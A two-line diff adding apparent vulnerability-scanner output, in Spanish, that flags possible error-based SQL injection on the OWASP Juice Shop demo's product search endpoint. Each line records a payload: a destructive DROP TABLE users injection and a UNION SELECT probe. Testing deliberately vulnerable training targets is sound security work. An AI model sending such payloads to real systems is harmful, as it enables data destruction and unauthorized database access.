@@ -1,0 +1,2 @@
+[+] Posible SQLi (error-based) en: https://demo.owasp-juice.shop/rest/products/search?q=test | Payload: '; DROP TABLE users; --
+[+] Posible SQLi (error-based) en: https://demo.owasp-juice.shop/rest/products/search?q=test | Payload: ' UNION SELECT null,null --
